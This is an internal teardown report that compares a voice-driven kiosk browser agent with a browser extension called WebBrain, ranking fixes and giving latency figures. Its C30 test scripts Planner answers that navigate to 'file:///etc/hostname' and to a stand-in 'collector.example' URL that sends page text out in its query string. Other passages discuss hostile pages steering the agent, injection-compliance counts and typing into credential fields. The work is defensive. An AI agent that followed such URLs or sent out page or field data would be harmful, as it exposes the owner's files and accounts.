# WebBrain teardown

Written 2026-10-31. Research only: nothing in `ours` changed, nothing filed.

## Read this first

**Pinned.** Ours: `gitlab/main` `7597c6cf` (`7597c6cf292fccc9223e7832459c29b4fc1e4797`). WebBrain: `351ca8ca` (`351ca8cab82f8bfafe9e11ae321a4652fccbed23`). Citations read `ours:path:Lx-Ly` and `repo:path:Lx-Ly` at those trees. Kiosk logs are a copy of the last 10 days taken 2026-10-31, on the kiosk's installed build, not necessarily the pin.

**Where this report differs from your brief, and why.**

| your brief | this report | why |
|---|---|---|
| Top 10 ranked by impact divided by effort | Ranked by Yield. Impact/effort is a side column | `AGENTS.md` and `docs/agents/yield.md`: yield is per-day × distance, effort breaks ties only |
| WebBrain is MIT; ports need MIT attribution | GPL-3.0-or-later from 33.0.0 | Section 7. Every recommendation here is the idea only |
| WebBrain is an LLM tool-use loop | It also asks closed fixed-choice questions (`semantic-decisions.js`), and has a default-off fast path on the same Jev (`systemone-fast.js`, `systemone-judge.js`) | So "JEV fit" compares two uses of one model, not LLM against Jev. Sections 2 and 5 |
| Context placeholders (`<<one paragraph…>>`) | They were never filled in. The orchestrator filled them from `AGENTS.md`; the text is below | So you can correct it. Every agent worked from this text |
| "GitHub issues" | GitLab issues on `jbsx/bingbong` | `docs/agents/issue-tracker.md`: the GitHub account is suspended |
| No limit given on asking Jev | The stored frugal rule applied: one case, at most 3 asks per hypothesis, with a cap of 24. **13 asks used**, all `jev-1.14.0` | `findings/measurements.md`. No Planner calls, no gate, no suite, no app launch |

The paragraph every agent was given in place of your placeholders (`brief.md`):

> Bing Bong is a voice-first browser appliance for one person, its owner, on a 21-inch kiosk at home, spoken to from 2 m. It is an Electron shell with a web pane driven over CDP, a dashboard (Idle Screen, news, weather, calendar, music), and a local voice pipeline (wake word, STT, TTS). The aim is an agent that completes a task as fast as it can. It is built and used daily, single user, no public release.

> Jev, the Decision Model (`ours/src/main/decision/`, `ours/src/core/ports/decisionModel.ts`), answers typed questions over a text state (a Choice among named options, a Noul probability) and generates nothing. It reads every line the grammar does not settle. Code shapes the ask (the card, the choices, the steps, the loop around the answer: hops, Verdict, progress Noul); Jev keeps every choice. Where a generative LLM is still used: the Planner (Errands, chat model) and the Story Brief writer (News card lines, off the Command path). Claimed advantage: low latency and cost per decision. Test that claim from evidence, don't assume it.

**Paths.** `findings/`, `report/`, `prompts/`, `verify/` and `measure/` named in this report sit in `~/Projects/webbrain-teardown/` on the dev PC, outside the repo; `ours` and `repo` are the pinned read-only trees there.

**How to read the numbers.** Counts and states are `yield.md`'s as listed; this report changes none. The Jev checks are single-case hypothesis tests, not a baseline, and none sets a state. "Measured" means run, "read" means read from code or logs only; each claim says which.


## 1. Executive summary: the top 10

**Seven rows are yield claims; three are marked no yield claim.** Only seven candidates still have evidence for a place on the list, so the last three come from the no-claim ranks rather than being dressed up to reach ten. Two of the seven, C6 and C8, are untested and stand on what is said in their rows.

**The ranking rule** is kept from `report/candidates.md` section 2: sorted by yield as `yield.md` lists it; inside a yield, by the distance the evidence says the change removes; effort breaks ties only. Log evidence says how a scenario breaks, not how much it weighs. Counts are `yield.md`'s, and where a count is the agent's guess of 2026-10-23, so is the yield. The Jev checks (T1 to T7, 2026-10-31) are single cases on `jev-1.14.0` with at most 3 asks each. They set no state (`findings/measurements.md`).

**Side** is the impact/effort order your brief asked for, set in `candidates.md` before the tests. It is for reference only.

| # | id, change | Scenario | Place | State, with dated evidence | Change | effort | side |
|---|---|---|---|---|---|---|---|
| 1 | **C1.** A fragment finishing the line before reads as `joins` | `overlap` | Yield 20 (~10 × 2; count the owner's, 2026-10-27). Nothing above it; tied with `play` and `control` | `partly`: 17/26 on the shipped road (`overlap:gate --with-jev --road audio`, 2026-10-29). How it breaks: 5 of 20 kiosk Fates look wrong, one class, by agent-loop's reading, no ground truth. **Measured** T1, one line, `Nicki Minaj.` (turn-mvtmtyol-vh): `goes_on` top 3 of 3 at 0.39–0.44, `joins` 0.27–0.31, overall conf 0.19–0.25; the kiosk's own read agrees. A near-even fork among three labels. None of the 26 Sequence Cases reaches it | Stays `partly`. Removes the "add to it, correct it" fragment share. Asks the Fate differently (`ours:src/core/command/runningCommand.ts:L91-L112`), since unsure goes on (`ours:src/core/command/applianceCard.ts:L317-L319`). No other scenario moved | M | 4 |
| 2 | **C2.** Mic capture and canceller outside Chromium | `overlap` | Yield 20 (~10 × 2). Tied at the top; below C1, since its route is untested | `partly`, same run. 2 of the 9 reds: `10-move-on-while-speaking`, `10-stop-while-speaking` (#490, #512). Capture is `echoCancellation: true` in a renderer (`ours:src/renderer/src/micCapture.ts:L28-L32`). **Route untested** | Stays `partly`: 17/26 to 19/26 at best. No fork. No other scenario claimed | L | 12 |
| 3 | **C5.** A sure done with no passage says something | `question` | Yield 10 (~5 × 2). Below `overlap`, `play`, `control` at 20 | `partly`. The row's one "still breaking" line: BBC weather ends done, nothing said, passage none 0.64 (turn-mvm63gpl-l, as turn-mvl575cq-3, typed, 2026-10-24, Mammoth). **Measured** T4: 7 silent spoken dones in the logs, none owed words, by the measure agent's reading; closed read `shown` 1.00 ×2 on one negative; no positive case exists | Stays `partly` (the Copy click on the Verdict hop remains). Removes that break. A fixed line would add speech to all 7, so the closed read is the safer arm, and that fork needs a positive case first | S | 1 |
| 4 | **C6.** No false done on an empty landing | `open` | Yield 10 (~5 × 2). Below the 20s, level with `question`, `read`, `search` | `partly`. `open voicestudio` reads yes 0.75 and 0.76 on an empty page and ends done (cli-5-mvm5vjrc, typed, 2026-10-24, Mammoth, ledger open). **Untested:** T5, 0 of 136 Verdict asks class as empty, so 0 asks. Which goes first, the fact or a higher bar, is unanswered | Stays `partly` (the mishear remains). Removes one of the row's non-wall breaks | S | 3 |
| 5 | **C7, the plain-line half only.** The "number" line goes when no number was said | `open`, also `read`, `search` | Yield 10 (~5 × 2). Below the 20s | `partly`. **One** logged spoken line carries this: turn-mvsfglol-3 (hop 1 of turn-mvsfgjo9-vh, `Click on the first link.`, ended wall) has `ref 1 refused…`, so by reading `failureLineOf` it says `That number isn't one I can use here` (`ours:src/core/command/spokenFailure.ts:L70-L71`, `ours:src/core/command/spokenFailure.ts:L92-L94`). TTS text is not logged. The other cited line, turn-mvsfg84d-2 of turn-mvsfg0oe-ve, has `the text block is no longer on the page` and gets the general failure line. **The going-on half is unsupported:** T6, the re-read's card equals the refused card, `click-1` 0.92, 0.94, a phone sign-up | No state moves; the wrong sentence goes. Going on after a refusal is not part of this row | S | 5 |
| 6 | **C8.** Line-first yield when the budget cuts | `read` | Yield 10 (~5 × 2). Below the 20s. The row is called stale in section 6 | `partly`. `show me the part about his death` takes 3 calls, `Toggle the table of contents` at 0.51 first (cli-32-mvm65npd, typed, 2026-10-24). 11 kiosk asks cut, all Wikipedia. **Untested:** T7 could not run (`Do it.` has no content word; cut blocks are not logged). Rests on reading (`ours:src/core/command/jevReading.ts:L949-L951`, `ours:src/core/command/jevReading.ts:L1371-L1385`). Not confirmed that the cut caused that hop | Stays `partly`; toward one hop on long pages, if the cut is the cause | S | 6 |
| 7 | **C9.** Page's declared image as a Capture Op | `goal` | Yield 4 (~2 × 2, a guess). Below every row with yield 5 and up | `partly`: 19/60, `goal:gate` 2026-10-27. `goal-13` never done: the watch page draws no image (`ours:fixtures/jev-cases/cli-3-mvph9ink.json:L264`). Capture Ops today: `ours:src/core/command/captureOp.ts:L4-L12`; `og:image` read for News alone: `ours:src/core/news/storyImage.ts:L293-L296` | Stays `partly`. One of 20 cases, at most +3 on 19/60. Not measured | S | 9 |
| 8 | **C3.** Remembered names on the card | touches `play`, 20, `partly` | **No yield claim.** A yield-20 row below yield-4 rows would break the sort, and the one case that could support it did not | **Measured** T2, `Play Tum See Tum Tuck by Neon` (turn-mvp8igvj-v2): arm kept `s1-6` 0.93, 0.94, remembered names 0.00 each. One case, one wording; it does not refute the idea. The ledger marks that line fixed (#456, 6a6f35a1) | None claimed. A `jev:gate` arm could reopen it | M | 7 |
| 9 | **C10.** Hold: a stopped arm, a withheld read answered, a bound | touches `control`, `overlap` | **No yield claim.** The case that happened is fixed at the pin (5403389f) | Remainder by reading only: a `back` with neither commit nor in-page step has no stopped arm (`ours:src/main/browser/paneNavigation.ts:L279-L292`; `commitOrStop` has one, `ours:src/main/browser/paneNavigation.ts:L245-L256`), and custody releases only on settlement (`ours:src/core/browser/unsettledAction.ts:L216-L223`). No logged case at the pin | None on a normal day. Closes a rare, half-hour loss of control (2026-10-25, 1,745 refusals, T8) | S arm, M bound | 8 |
| 10 | **C11.** Fallback host, 750 ms | touches `control`, `overlap` | **No yield claim.** 0 host failures since Jev on 10-28, in 183 reads (T8) | No break on a normal day. Today one hung host means 3.0 s then nothing (`ours:src/core/decision/decisionRouting.ts:L62-L69`, `ours:src/main/decision/createDecisionModel.ts:L112-L113`) | None on a normal day. A hung host goes to about 1.4 s (`findings/providers.md`). Env only | S | 10 |

**Just below the ten, no claim.** C4, C12, C13.

C4 was rank 4 in `candidates.md` and side 2. T3 corrects `context`'s and `candidates.md`'s account of `Go back to highs and lows.` (turn-mvsiijty-v1a): the line ended done on the right page with `back`, and `say_playing` shows HIGHS AND LOWS was the song playing, so a `previous` line would name `Famous`. The other cited line also ended done. No failed line remains behind it, and the Queue half is untested.

**Effort, for ties only.** C5, C6, C7, C8, C9 are S; C1 is M; C2 is L.

**The side-column order** is C5, C4, C6, C1, C7, C8, C3, C10, C9, C11, then C16 at 11 (a measure, no state moves) and C2 at 12.

### A rule to challenge, for the owner to decide

Yield weighs frequency, so a rare irreversible event ranks low. C30 (Planner `navigate` reaching `file:` and text-in-query with no confirm) and C32 (typing into credential and payment fields) sit at no-yield rank 21 of 22, though both are S effort.

**Recommendation: you decide whether hard-policy safety holes sit outside the Yield order.** The ranking above is not changed for this.

**C30, what T9 ran** (2026-10-31, `measure/src/main/run/t9navigate.test.ts`, 13 tests passing, 0 Jev asks). A scripted Planner answer went through the real `readPlannerAnswer`, then the real `createCommandRunner` on `errand do the thing`: real Errand loop, `resolveAction`, `confirmOf` and `navigateAddress`, ending at a **fake browser** that records the URL. `normalizeUrlInput` was called directly. `attachMeasurementAccessGuard` was real, on a stub session.

| Planner's url | class | reached `browser.navigate` as | said aloud |
|---|---|---|---|
| `file:///etc/hostname` | `stays` | that URL, no confirm | only the Planner's `Done.` |
| `http://collector.example/c?d=Text%20the%20page%20showed…` | `stays` | that URL, query intact, no confirm | only the Planner's `Done.` |
| `about:blank` | `stays` | that URL, no confirm | only the Planner's `Done.` |
| `javascript:alert(1)`, `chrome://settings`, `data:text/html,hi` | `stays` | a DuckDuckGo search for the words, not loaded as schemes | only the Planner's `Done.` |
| each of the above | `leaves` | nothing, with no yes in the window | `This will open: “it”. Yes or no?`, naming no host |

**What T9 did not show:**
- That any model would do this. No Planner was called and the class is scripted.
- That a `file:` URL loads. `loadAndSettle` did not run, no real browser was involved, and `/etc/hostname` was not read.
- That page text reaches the Planner in usable form, or that any real page or load was involved. The query string is the test's own.
- That a real controller wrapper, custody or the adblocker adds nothing. A grep finds no `file:` scheme check in `src/main/browser` or `src/main/run`, and that is reading, not running.

**The guard.** Running it showed it is off without its variable: an empty env registers 0 handlers. When on, it refuses `file:` and returns null for the http URL, so it never covers text-in-query.

**The kiosk fact.** `BINGBONG_MEASUREMENT_ACCESS_GUARD` is unset in the running process, the kiosk `.env` and its service file, read by the orchestrator 2026-10-31. T9's own agent did not read the kiosk's env.

This is as designed and not a lapse. The guard's header says it is for measured captures and leaves production unchanged, and that the normalizer admits `file:` on purpose for a user typing a local path (`ours:src/core/browser/measurementAccessGuard.ts:L1-L19`, `ours:src/core/browser/urlInput.ts:L3`, `ours:src/core/browser/urlInput.ts:L36`). So a closure belongs on the Planner's road, not in the normalizer. The path by reading: `ours:src/core/errand/plannerCommand.ts:L147-L148`, `ours:src/core/errand/confirmClass.ts:L65-L91`, `ours:src/main/browser/createCdpBrowserController.ts:L1642-L1644`, `ours:src/main/browser/attachMeasurementAccessGuard.ts:L24`.

**C32 is read only; T9 did not touch it.** `credentialField` and `paymentField` are collected (`ours:src/main/browser/collectPageScript.ts:L392-L403`, `ours:src/main/browser/collectPageScript.ts:L1050-L1053`), and outside tests only the collector and `snapshot.ts` carry `credentialField` (grep, re-run 2026-10-31). The Planner may type into such a field. Only `type=password` values are dropped from the ref line (`ours:src/main/browser/collectPageScript.ts:L1062-L1064`), so a card number in a text field rides it. How much this weighs depends on what the pane is signed in to (section 6).

### Proposed Scenarios

Fifteen situations the findings met that `yield.md` does not list. None has a count, and none is ranked. **Each needs one thing from you: a per-day count, or a strike.** I suggest none.

Break-even is the per-day count at which count × distance equals that yield. The first six are `missing` (distance 4). The `undated` nine carry no yield until reproduced, so their figures assume a reproduction at `breaks` (3); at `partly` (2), multiply by 1.5.

| name | what it is | state | evidence | to match goal (4) | wake (5) | setting, wall, panel (6) | question, open, read, search (10) | overlap, play, control (20) |
|---|---|---|---|---|---|---|---|---|
| `read-out` | Have the part of the page in view said aloud | `missing` | ADR 0099 removed the Page Read; perception's question, recommended answer closed for now, for your count. 13 spoken read lines 10-26 to 10-29 | 1 | 1.25 | 1.5 | 2.5 | 5 |
| `later` | Say a line for a later time: "stop the music in half an hour" | `missing` | The Timer carries no words and runs no line; `goal-12` asks for a timer (`findings/reuse.md`) | 1 | 1.25 | 1.5 | 2.5 | 5 |
| `routine` | One spoken name runs several known lines: "good night" | `missing` | Nothing binds a name to steps; logs show no repeated sequence (`findings/reuse.md`) | 1 | 1.25 | 1.5 | 2.5 | 5 |
| `watch` | Be told when something changes: "tell me when this song ends" | `missing` | No road, one pane (`findings/reuse.md`) | 1 | 1.25 | 1.5 | 2.5 | 5 |
| `video-words` | Ask what a video says, or go to the part about X | `missing` | No spoken line in the logs asks for it (`findings/walls-media.md`) | 1 | 1.25 | 1.5 | 2.5 | 5 |
| `protected-media` | Play a film or show from a DRM service by voice | `missing` if wanted | No transcript in 10 days (`findings/electron-browser.md`) | 1 | 1.25 | 1.5 | 2.5 | 5 |
| `hung page` | The pane hangs on an action and every line after it is refused until it ends | `undated` | One sighting, 2026-10-25, not reproduced. One sighting is not a count (`findings/traps.md`) | 1.34 | 1.67 | 2 | 3.34 | 6.67 |
| `hostile page` | A page's words try to steer a Task or an Errand | `undated` | Never reproduced; 0 hits for three override phrases in 10 days (`findings/quality.md`, `findings/traps.md`) | 1.34 | 1.67 | 2 | 3.34 | 6.67 |
| `host-down` | The decision host fails while you speak | `undated` | 0 failures in 183 reads since 10-28 (T8); returns on any outage (`findings/providers.md`) | 1.34 | 1.67 | 2 | 3.34 | 6.67 |
| `restart` | After the app restarts, carry on with what was playing | `undated` | Log file names show 59 restarts over 8 days, cause unknown (`findings/context.md`) | 1.34 | 1.67 | 2 | 3.34 | 6.67 |
| `return` | Go back to something heard or seen earlier, by its name. May be judged part of `control` | `undated` | Kiosk chains (`findings/context.md`); T3 shows two such lines ended done | 1.34 | 1.67 | 2 | 3.34 | 6.67 |
| `pdf` | Read a PDF (`read-a-PDF` merged) | `undated` | No transcript says `pdf` in 10 days; what a PDF link does in our pane is not settled by reading (`findings/electron-browser.md`, `findings/perception.md`) | 1.34 | 1.67 | 2 | 3.34 | 6.67 |
| `answer a confirm` | Say yes or no to what an Errand said back | `undated` | Never run live; `yeah` is not an accepted line, `Yeah.` is in the logs 7 times, not as answers (`findings/safety.md`) | 1.34 | 1.67 | 2 | 3.34 | 6.67 |
| `stray line acts on the account` | A line not meant as a command reaches a consequential control or an Errand | `undated` | turn-mvqi2ulz-v5 (Dislike, Report, Sign in) (`findings/safety.md`) | 1.34 | 1.67 | 2 | 3.34 | 6.67 |
| `wall-handoff` | You pass a wall by hand and the line carries on unsaid | `undated` | `goal` has 5 sign-in cases that never pass (`findings/walls-media.md`) | 1.34 | 1.67 | 2 | 3.34 | 6.67 |


## 2. Where we are ahead

**The short version.** The lead is real, and most of it is architecture read from code, not measured against anything. No WebBrain run was made for this report, and their own Jev benchmark has a design and no number (`repo:test/jev/README.md:L3-L5`), so no row here is a head-to-head timing. "Logs" below means counted from the kiosk logs copied 2026-10-31 (the model numbers cover 2026-10-25 to 2026-10-31); "read" means read from the two trees at the pins. The right-hand column gives what limits the claim, and it stays empty where nothing does.

### The claimed advantage: low latency and cost per decision

The brief asked for this to be tested, not assumed. The result is that it holds, and it is not where the wait goes.

| claim | evidence | kind | what limits it |
|---|---|---|---|
| Jev is fast and steady | `jev-1.14.0`: p50 264, p95 520, max 599 ms; 0 refused or timed out in 146 asks. Barely moves with the card: 159 ms under 1.5k tokens, 273 ms at 6k+. Mammoth on the same days: 1,192 / 2,142 / 2,943 ms, 12 of 429 failed (`findings/decisions.md`) | logs | The ask is 267 ms of a 1,869 ms page Reaction (n=20, spoken, hop 0); the page collect is 1,107 ms of it. Instant is p50 2,210 ms against a 700 ms promise, and that p50 mixes both models (`kiosk-perf-report.txt` L395, L400-L401, via `findings/providers.md`). The ask no longer explains the Tier miss |
| Faster than a chat model on the same job | ADR 0095's chat arm: the same corpus through glm-5.3 at p50 4.7 s, p95 13.7 s. `planner-step` on the kiosk: p50 2,749 ms, p95 8,152 ms | ADR number, not rerun; logs | This is Jev against a chat model, not us against WebBrain. Their fast path is the same Jev, with a 1 s constant as its deadline and a speedup their own README calls unverified |
| Cost per decision is negligible | 2.74 M input tokens over 6.4 days: $0.00024 an ask, about $0.02 a day (`findings/decisions.md`) | logs × their price | $0.042/M is WebBrain's constant (`repo:src/chrome/src/agent/systemone-judge.js:L185`), not TypeSafe's list and not our bill. Either way, cost is not a lever for one owner |

### Using one model better

WebBrain also asks Jev, so this is where the comparison is fairest: two uses of one model.

| claim | evidence | kind | what limits it |
|---|---|---|---|
| The whole class on the card | Their path: the first 24 top-document controls, no frames, no shadow, no page text (`repo:src/chrome/src/content/accessibility-tree.js:L975-L980`). Ours: 74 % of page cards carry more than 24 refs (median 40, max 75); 9 of 68 ref picks sat past the 24th; `Go to YouTube and find the oldest video uploaded.` → `Me at the zoo` was position 43 of 57, and right | logs, read | Position is in our order, not their walk. Most of the 9 were low-probability or test lines. Our card has its own blind spots: a flat 75-ref cap outside the budget (C20), and a cut by nearness alone (C8) |
| One reading does the whole step | Line, Slot, amount, place, end and progress in one call, with no chat model behind it. Theirs falls back to an LLM on anything uncertain and needs one for text | read | Reading is not being right: 78 of 88 Where Asks read `none` again. Most are ambient (`Mm-hmm.`), but `Go to Idle Screen.` read `none` twice on page cards |
| No tuned bar on the hop-0 line | WebBrain's 0.85 would divert 35 % of 164 spoken lines to catch at most 10 re-says; 48 of the 58 lines under 0.85 were not re-said. Supports ADR 0076 | logs | "Re-said" is a stand-in for a Frustration (next line within 15 s, ratio above 0.6), and part of it is STT. The sample is small. The Verdict's `yes` may still want a higher bar (C6) |
| The state grounds `done` | Text in view, Done so far and pages visited are on the card; their Jev state has neither page text nor history, so `done` cannot be grounded there | read | A grounded card still ended done on an empty landing: `open voicestudio`, `yes` 0.75 and 0.76 (`cli-5-mvm5vjrc`, typed, 2026-10-24, Mammoth; C6). T5 could not test it: 0 of 136 Verdict asks class empty |

### Lines that need no model

| claim | evidence | kind | what limits it |
|---|---|---|---|
| Local Match | 105 of 409 Tasks ended `local_match`, firing with no model (`ours:src/core/command/localMatch.ts:L11-L25`). No counterpart in what was read of theirs | logs, read | Not searched for across their whole tree. 12 ledger lines carry the stage `local_match`, so it can fire wrongly |
| Media Ops | 59 `media` decisions, 58 ending terminal. One evaluate with facts before and after (`ours:src/main/browser/pageMediaScript.ts:L228-L261`). WebBrain has no media op; YouTube control is a line of keyboard shortcuts in a site note (`repo:src/chrome/src/agent/adapters.js:L16438`) | logs, read | A `play` the policy refuses is said as "Playing." until the next read (`ours:src/main/browser/pageMediaScript.ts:L259`). Terminal does not mean within the Tier |
| Media a wall interrupted | Only what was playing when the wall drew resumes (`ours:src/main/browser/collectPageScript.ts:L143-L155`). No hits in their cookie-banner and autoconsent files | read | |

### What not generating buys

| claim | evidence | kind | what limits it |
|---|---|---|---|
| Jev has no output channel | It picks a closed option, and a Slot is a span of the owner's own transcript (`ours:src/core/command/jevReading.ts:L198-L214`). No WebBrain default path has that property for its main model | read | A page can still steer the pick, because labels sit in the option text (`ours:src/core/command/jevReading.ts:L1406-L1407`). **This does not cover the Planner**, which writes `navigate` URLs and `type` text: section 1's rule to challenge, C30, C31 |
| No `evaluate` for any model; no line off the card | `ours:src/core/planner/plannerAsk.ts:L14`, `ours:src/core/errand/plannerCommand.ts:L10-L17`, `ours:src/core/errand/plannerCommand.ts:L177`. Theirs has `execute_js` on Dev | read | The Planner keeps `navigate`, `search` and text, which is where the holes are |
| Stateless card | Removes compaction, emergency trims, orphaned tool-result repair and snapshot budgets as a class of work and bugs | read | Songs and lines said earlier are not on the card either (C3, C4), though T2 and T3 did not support changing that on one case each |
| The Verdict rides the same call | No separate judged request; their `done` guards police a writer we do not have | read | An end can still say nothing (C5) or be false (C6). An Errand's end has no outcome class at all, and theirs is better there: an Errand ending in failure logs `done` (`turn-mvqi2ulz-v5`, `turn-mvsihi98-v17`; C35) |
| Task loop discipline | Card rebuilt each hop, set-aside by label, Progress Noul, 5 actions, automatic hand-off. Their 988-line loop detector and 130-step Continue have no job on a Task | read | On Errands we are worse: a chat model is what that detector is for (C37) |
| We started at the closed question | They reached it after about 160 commits and two large deletions. `agent.js` went from 4,509 lines (May 1) to 60,758 (October 31), and it grew 10,000 lines in the 17 days after the word lists were retired, because the guards around the generator remain (`findings/traps.md`, `git show` per date) | measured on their history | That is their cost, not our quality. Walls are the exception: `dialogPolicy.ts` has 10 commits and the Guardian wall regressed with 6486d6e1, so on walls `traps` finds us "not obviously better" |
| Answers in the page's words | No writer on the main path, so no invented or withheld text (`ours:src/core/command/answer.ts:L12-L14`) | read | The same choice is why a done can say nothing (C5) |

### Overlap, and voice as the form

| claim | evidence | kind | what limits it |
|---|---|---|---|
| Fate is read, not chosen by key | Four outcomes with a safe default (`ours:src/core/command/runningCommand.ts:L91-L112`), and each ending said. WebBrain's Queue or Steer is a key the person presses, which voice cannot do | read | **Our top item is a failure on this road.** T1: `goes_on` 3 of 3 on a fragment finishing the line before (C1). A join loses the Task's record (C14), and two lines can write the same page (C15). `overlap` is at its gate's state, and #508 and #510 have code at the pin, not rerun |
| Reach into a line already ended | A `joins` reaches a line that fired and ended (`ours:src/main/run/commandRunner.ts:L4053-L4063`), and the line stays on the card for 15 s. Theirs makes it the next turn | read | |
| Waits come from the work | Stage, object and seconds (`ours:src/core/pipeline/runProgress.ts:L156-L177`), against filler rotated on a timer (`repo:src/chrome/src/ui/sidepanel.js:L14695-L14701`). Words on stages, not selectors (`ours:src/core/pipeline/stageWords.ts:L34-L71`) | read | Principle 2's spoken bound is not there: "still thinking" is screen only (C24) |
| Failures name what to say next | `ours:src/core/command/tryLine.ts:L79-L83`, where theirs mostly says "please check the page" | read | For `unsure`, `notFinished` and a refused ref, the next line is `help`, which is not a line that would have worked (C23). The "number" line is not a plain line, with one logged spoken line behind that (C7) |
| The screen says whether speaking now will be heard | `earPhase`, and a narrated cold start (`ours:src/core/voice/voicePrompt.ts:L39-L72`). Status type 65 px (`ours:src/renderer/src/styles.css:L141`) | read | They have no room to serve, so this is fit rather than a race won |
| Silence refuses; no standing grant | `ours:src/core/errand/confirmClass.ts:L93-L96`, against a plan that runs after 2 minutes (`repo:src/chrome/src/agent/agent.js:L23590-L23593`) and an "Allow always" (`repo:src/chrome/src/agent/permission-gate.js:L39-L43`) | read | The window can close while the answer is being heard (C36). Two confirm lines say the wrong thing (C34). The word list is eleven English words and misses `Share`, `Checkout` and `Confirm` (C33); their `control_effect` is better there |

### The platform

| claim | evidence | kind | what limits it |
|---|---|---|---|
| Reach without a gesture | The appliance raises its own surfaces from a spoken line; an extension cannot open its panel that way (`repo:src/chrome/src/background.js:L2903-L2905`) | read | |
| Native process | Local STT, wake word, `yt-dlp`, the Bluetooth scale, night dim. They host models in offscreen pages | read | Mic capture and the canceller still sit inside Chromium (`ours:src/renderer/src/micCapture.ts:L28-L32`), which is C2 |
| Document-start code in every frame, adblock included | WebBrain has no blocking at all (`repo:src/chrome/manifest.json:L6-L28`). Frames need no CDP session bookkeeping (`ours:src/main/browser/createPaneBrowserController.ts:L26-L48`) | read | |
| One flat page across frames and open shadow roots | Merged numbering with no extra tool or hop (`ours:src/core/browser/frames.ts:L79-L167`), against per-site reach | read | That is refs only. The text walk does not enter open roots, and nothing reaches a closed root (C42). No ledger line blames either |
| Facts on the ref line | AX states, media state, region position, what a closed menu holds, a file field's accept. Off-view text is targetable in one ask through Show Ops | read | Not all of their `formatLine` was read. A covered control is not named at read time (C28) |
| No open port | The whole pairing, challenge and approval stack protects a socket we do not have (`ours:src/main/browser/createCdpBrowserController.ts:L109-L109`) | read | |
| No infobar, worker restart, second browser or store review | A large block of their defensive code has no counterpart here. The Firefox diff was not assessed against us (`findings/firefox-diff.md`: out of its scope) | read | |
| A smaller blast radius | One owner, a kiosk, a separate partition | read | "Mostly signed out" is an assumption. T8: `Sign in` on 0 of 230 YouTube cards to 10-26, then 53 of 71 from 10-27 09:24, which disagrees. See section 6 |

### Budget, hosts and walls

| claim | evidence | kind | what limits it |
|---|---|---|---|
| One budget, in the smallest host's tokens, with named cuts | 16,384 tokens at 2.38 characters each (`ours:src/core/decision/cardBudget.ts:L18-L26`). Each cut is on the ask's record, and an over-budget ask is never sent. Theirs assumes 4 characters a token and sizes vary by provider, so nothing they test holds across models | read | The cut is named in the record, not on the card (C8). The size retry reads Baseten's wording only (`ours:src/core/decision/cardBudget.ts:L100-L105`) |
| A real failover chain with per-attempt records | No sleeping on the Command path; WebBrain has no host failover | read | **The kiosk has not been using it**: no fallback host is set (C11). 0 host failures since Jev on 10-28 in 183 reads, so nothing has tested it there |
| Trusted click first, no automatic second click | No veto machinery. A no-effect click costs about 150 ms against about 2 s (`ours:src/main/browser/createCdpBrowserController.ts:L2297-L2306`) | read; logs for ours | Both figures are bounds read from code. 6 of 15 logged click spans hit our 150 ms cap, so a slow handler may be missed; `doneFacts` re-reads and corrects the line. A dialog control takes 2 s |
| Ref identity by DOM node | A mis-aimed action is refused, not re-resolved (ADR 0033, `ours:src/main/browser/createCdpBrowserController.ts:L1913-L1922`) | read | The guard is right and the reaction is weak: a refusal ends the Task (C7) |
| A signature that ignores clocks and counters | `ours:src/main/browser/createCdpBrowserController.ts:L1331-L1343`; theirs takes 1,800 characters of page text and discounts it | read | A text-only effect is invisible to it (C29) |
| Walls: no per-page cost, Jev chooses | 0 ms on a clear page against their 1.2 s wait (`repo:src/chrome/src/agent/cookie-banner-host.js:L104-L116`). Consent choice over the wall's own wording, with a pay-to-reject veto in hard policy (`ours:src/core/browser/dialogPolicy.ts:L64-L71`) | read | We are worse at recognising the wall (C25), and 4 of 5 consent asks in 10 days are repeats (C27). Their kind reading says more than our `in_the_way` (C26) |

### Learning and evidence

| claim | evidence | kind | what limits it |
|---|---|---|---|
| Learning with no save step | Learned Terms admit a name on a page's witness or on recurrence (`ours:src/core/voice/learnedTerms.ts:L118-L124`). Remembered Songs earn a route by a 30 s stay. Theirs is all explicit, and its memory admits a single reading at 0.85 | read | Voice was outside `reuse`'s search of their tree |
| By kind, not by site | Media ops on any site (`ours:src/core/browser/mediaOp.ts:L6-L38`); confirm class on any label. Their protection depends largely on a URL matching one of about 135 records (`repo:src/chrome/src/agent/adapters.js:L18263-L18275`), and they say stale adapters are worse than missing ones (`repo:src/chrome/src/agent/adapters.js:L10-L37`) | read | The confirm class is itself a word list |
| We can measure Jev | 477 corpus cases, 177 distinct lines, most from real asks; a multi-model gate (on Jev alone since the free models ended on 2026-10-28); a replay; asks logged whole. Their export omits evidence and raw responses, so a corpus cannot be built from a real run (`repo:test/jev/README.md:L45-L48`) | read | No gate was run for this report |
| Weighed by the owner's day | Yield, and a ledger of 277 lines, 73 open, by first failing stage (`findings/quality.md`, count of `fixtures/failed-lines/`). Their suite treats a Stripe product and a Wikipedia read alike | read, counted | Yield's own weighting is challenged in section 1, and three `yield.md` rows are stale (section 6) |
| We measure the wait the person feels | Tiers and Felt Reaction from the last speech frame (`ours:docs/agents/reliability.md:L11-L15`). Timing is tested black-box with seeded arrival points (`ours:scripts/overlap-gate.ts:L12-L33`); `stt:gate` has no counterpart found (names only in their `test/`); a skip is red (`ours:scripts/gates.ts:L2-L10`) | read | **The headline is not computed.** Commands between Frustrations is a hand count (36 of 181, 25-27 October), and the Tier bars cannot be read off a report (C40). Their owned lab has an oracle that cannot false-red, and ours can (C38) |

### What this does not show

- **Injection.** Their saved runs obey 2 of 337 wrapped and 0 of 295 raw (`findings/quality.md`, unpaired). So their ablation cannot show the wrapper helps. That is no evidence for us: we have no wrapper on Planner read parts and no measure of our own.
- **Speed against WebBrain.** Nothing here times them. A faster ask is shown only against chat models.
- **Being right more often.** No shared task was run on both apps, so no finding supports "we complete more".

## 3. Electron or a full browser

**Recommendation, for you to decide: stay on Electron, do not fork, and close the question for now.** No scenario on the Yield list is held back by Electron in the evidence read. Of 127 points of listed yield, one sub-case of `overlap` touches Chromium (the echo canceller, #490, #512), and it has a route that needs no fork (C2). That sum is one agent's reading of how each row breaks, not a measurement (`findings/electron-browser.md`).

**The limit of this evidence.** Nothing was run. Logs show what you did on an appliance that cannot do certain things, so a missing request may be a learned habit: only you can say. Platform facts about Electron, Chrome and CEF come from their docs or memory and are marked †; they are in section 6.

### What they cannot do, or do awkwardly, as an extension

"Have" means at the pinned SHA.

| limit in WebBrain | citation | `webContents.debugger` / Electron | full browser | what it means for us |
|---|---|---|---|---|
